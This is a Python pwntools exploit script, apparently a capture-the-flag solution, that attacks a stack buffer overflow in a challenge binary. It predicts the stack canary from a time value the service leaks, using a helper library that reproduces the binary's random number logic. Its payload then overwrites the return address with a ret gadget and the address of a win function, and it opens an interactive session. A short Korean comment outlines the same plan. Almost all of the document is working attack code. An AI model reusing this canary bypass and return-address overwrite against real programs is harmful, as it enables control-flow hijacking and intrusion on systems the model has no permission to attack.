from pwn import *
import ctypes

context.log_level = 'debug'
lib = ctypes.CDLL('./rand.so')
lib.enoughtime.argtypes = [ctypes.c_int64]
lib.enoughtime.restype = ctypes.c_int64
win = 0x401291
ret = 0x40101a
#p = remote('host3.dreamhack.games', 20860)
p = remote('host.docker.internal', '6699')
#p = process('./prob')
#pause()
p.recvuntil(b"time: ")

time = int(p.recv(10))
res = lib.enoughtime(time) & 0xffffffffffffffff

buf = b"a" * 0x10 + p64(res) + b"a" * 0x10 + p64(ret) +  p64(win)
p.sendafter(b"data: ", buf)
p.interactive()

'''
    if(p.recv(1) == b"*"):
        p.close()
        print(i)
    else:
        print(i)
        p.interactive()'''



'''
time값 input -> ctypes -> rand for문 output
canary 우회 -> rip 조작 -> exploit
'''